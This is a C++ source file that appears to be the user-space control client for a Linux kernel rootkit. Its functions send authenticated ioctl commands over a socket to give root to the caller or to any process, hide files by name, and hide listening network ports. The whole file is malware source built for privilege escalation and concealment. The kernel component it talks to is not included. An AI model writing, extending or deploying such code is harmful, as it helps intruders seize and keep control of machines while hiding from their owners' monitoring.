#include "api.h"

int root_me() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }

    s_args args;
    args.cmd = ROOT_ME;
    std::cout << "root_me: send ioctl" << std::endl;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);
    
    close(sockfd);
    return 1;
}

int set_proc_root(pid_t pid) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }
    
    s_args args;
    args.cmd = ARB_ROOT;
    args.ptr = &pid;
    std::cout << "set_proc_root: send ioctl" << std::endl;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);

    close(sockfd);
    return 1;
}

int hide_filename(const char *fname) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }

    s_args args;
    char buf[MAX_BUF_SIZE];
    std::memset(buf, 0, sizeof(buf));
    std::strncpy(buf, fname, sizeof(buf) - 1);
    
    args.cmd = HIDE_FILE;
    args.ptr = buf;
    std::cout << "hide_filename: send ioctl" << std::endl;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);

    close(sockfd);
    return 1;
}

int hide_listening_socket(unsigned short portnum) {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        std::cerr << "Error creating socket\n";
        return -1;
    }

    s_args args;
    args.cmd = HIDE_PORT;
    args.ptr = &portnum;
    std::cout << "hide_listening_socket: send ioctl" << std::endl;
    int io = ioctl(sockfd, AUTH_TOKEN, &args);

    close(sockfd);
    return 1;
}
